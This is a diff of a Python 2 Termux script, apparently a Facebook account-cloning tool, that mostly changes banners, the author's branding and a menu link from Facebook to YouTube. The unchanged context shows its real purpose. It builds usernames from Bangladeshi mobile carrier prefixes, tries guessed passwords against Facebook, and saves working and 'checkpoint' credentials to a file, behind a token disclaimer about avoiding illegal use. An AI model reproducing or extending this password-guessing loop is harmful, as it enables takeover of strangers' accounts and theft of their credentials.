@@ -58,7 +58,12 @@ logo = """
 \033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
 \033[1;94m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
 *_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
-
+\033[1;91m        █▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
+\033[1;93m        █░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
+\033[1;92m        ▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
+\033[1;97m        █░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
+\033[1;96m        █▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
+\033[1;95m        ▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
 \033[1;92m##     ##    ###    #### ##    ## ##     ## ##       
 \033[0;94m###   ###   ## ##    ##  ###   ## ##     ## ##       
 \033[0;95m#### ####  ##   ##   ##  ####  ## ##     ## ##       
@@ -66,7 +71,6 @@ logo = """
 \033[1;92m##     ## #########  ##  ##  #### ##     ## ##       
 \033[0;94m##     ## ##     ##  ##  ##   ### ##     ## ##       
 \033[0;95m##     ## ##     ## #### ##    ##  #######  ######## 
-                                                   
 *_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
 \033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
 \033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
@@ -77,7 +81,7 @@ logo = """
    (   🍃 🌹 🍃   ) 💕
  💕`•.¸   💗   ¸.•` 💕 
      💕° •.¸¸.•° 💕   \033[1;92m𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌 🥱
-           💕💕        \033[0;94m 𝐈𝐓'𝐒 𝐁𝐑𝐀𝐍𝐃 🤟🍃🌻🍃
+           💕💕         \033[0;94m 𝐈𝐓'𝐒 𝐁𝐑𝐀𝐍𝐃 🤟 🍃🌻🍃
              💕     💕🍃🌹🍃💕  .💘
                     💕.•°``°•.¸.•°``°•.💕
                    💕(  🍃 🌹 🍃   ) 💕
@@ -87,8 +91,8 @@ logo = """
                                   💕         
 """
 logo2 = """
-\x1b[1;92m➣ NAME :           💗 MAINUL ISLAM  💗
-\x1b[1;91m➣ PAGE NAME :  💣 MAINUL ISLAM 💣
+\x1b[1;92m➣ NAME :           💗 MAINUL ISLAM 💗
+\x1b[1;91m➣ PGE NAME :  💣MAINUL ISLAM💣
 \x1b[1;93m➣ WHATSAPP NO :   👬 +88013008850528 👬
 \x1b[1;95m➣ WARNING :  👉 DON,T CALL ME ONLY TEXT🔫
 \x1b[1;96m➣ CLONING COUNTRY NAME :  BANGLADESH
@@ -97,7 +101,7 @@ logo2 = """
 \x1b[1;91m➣ NOTE :      🌍 1ST CLEAR TERMUX MEMORY DATA🌍
 \x1b[1;95m➣ NOTE :  🔎NO NEED VPN🔎 ( 🌷WITHOUT LOGIN🌷 )
 \x1b[1;93m➣ DISCLAMIAR :  👊AWAY FROM ILLIGAL WAY👊
-\x1b[1;93m➣ 𝐅𝐔𝐂𝐊 𝐘𝐎𝐔 𝐁𝐑𝐎 🖕🖕
+\x1b[1;93m
 """
 back = 0
 successful = []
@@ -134,15 +138,15 @@ def login():
 def menu():
 	os.system('clear')
 	print logo
-	print "\033[1;96m💖━━━━━━━━━💘💘💘( \033[1;92m𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌)💘💘💘━━━━━━━━💖\n" 
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(\033[1;92m𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌)💘💘💘━━━━━━━━💖\n" 
 	print '\033[1;97m[1]\033[1;92m GP'
 	print '\033[1;97m[2]\033[1;92m Robi'
 	print '\033[1;97m[3]\033[1;92m Airtel'
 	print '\033[1;97m[4]\033[1;92m Banglalink'
 	print '\033[1;97m[5]\033[1;92m Teletalk'
-	print '\033[1;97m[6]\033[1;92m Facebook'
+	print '\033[1;97m[6]\033[1;92m Youtube'
 	print '\033[1;97m[0]\033[1;92m Exit            '
-	print "\033[1;96m💖━━━━━━━━━💘💘💘( \033[0;94m𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌)💘💘💘━━━━━━━━💖\n" 
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(\033[1;92m𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌)💘💘💘━━━━━━━━💖\n" 
 	action()
 	
 def action():
@@ -221,7 +225,7 @@ def action():
 			raw_input("\n[ Back ]")
 			menu()
 	elif ahmad =="6":		
-		os.system('xdg-open https://www.facebook.com/Mainul.Islam.Official.Info')
+		os.system('xdg-open https://m.youtube.com/channel/UC2vSdMR8CU1UZsdNJK0Odtg')
 		login()
 	elif ahmad =='0':
 		exb()
@@ -292,7 +296,7 @@ def action():
  				                oks.append(c+user+pass3)
  				            else:
  				                if 'www.facebook.com' in q['error_msg']:
- 					                print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                print '\033[1;96m[𝐌𝐀𝐈𝐍𝐔𝐋-Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
  					                cps = open('save/checkpoint.txt', 'a')
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
@@ -309,7 +313,7 @@ def action():
  				                        oks.append(c+user+pass4)
  				                    else:
  				                        if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        print '\033[1;96m[𝐌𝐀𝐈𝐍𝐔𝐋-Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
  					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
  					                        cps.close()
